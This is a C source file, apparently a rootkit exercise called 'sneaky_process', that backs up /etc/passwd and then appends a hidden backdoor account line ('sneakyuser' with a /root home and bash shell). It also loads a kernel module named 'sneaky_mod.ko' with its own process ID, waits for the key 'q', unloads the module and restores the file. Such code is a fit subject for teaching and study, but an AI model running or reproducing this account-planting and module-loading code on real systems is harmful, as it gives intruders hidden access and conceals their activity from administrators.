#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <termios.h>

//Print Process ID
void printpid(){
    printf("sneaky_process pid = %d\n", getpid());
}


void addSneakyUser() {
    FILE *file = fopen("/etc/passwd", "a");
    if (file == NULL) {
        printf("Failed to open /etc/passwd");
        exit(EXIT_FAILURE);
    }
    const char *newUser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:/bin/bash\n";
    if (fprintf(file, "%s", newUser) < 0) {
        printf("Failed to write new user to /etc/passwd");
        fclose(file);
        exit(EXIT_FAILURE);
    }
    fclose(file);
}


void loadModule(){
    int pid = getpid();
    char command[256];
    snprintf(command, sizeof(command), "insmod sneaky_mod.ko pid=%d", pid);
    system(command);
}

void readInput() {
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    unsigned char ch;
    do {
        ch = getchar();
    } while (ch != 'q');

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
}

void unloadModule(){
    const char *moduleName = "sneaky_mod";
    char command[256];
    snprintf(command, sizeof(command), "rmmod %s", moduleName);
    system(command);
}


int main(int argc, char *argv[]) {
    //print its own process ID to the screen
    printpid();
    //copy the /etc/passwd file and open the /etc/passwd file and print a new line
    system("cp /etc/passwd /tmp/passwd");
    addSneakyUser();  
    //load the sneaky module, pass process id
    loadModule();
    //read input until it receives the character ‘q’ 
    readInput();
    //unload the sneaky kernel module
    unloadModule();
    //restore the /etc/passwd file
    system("cp /tmp/passwd /etc/passwd");
    remove("/tmp/passwd");
    return EXIT_SUCCESS;
}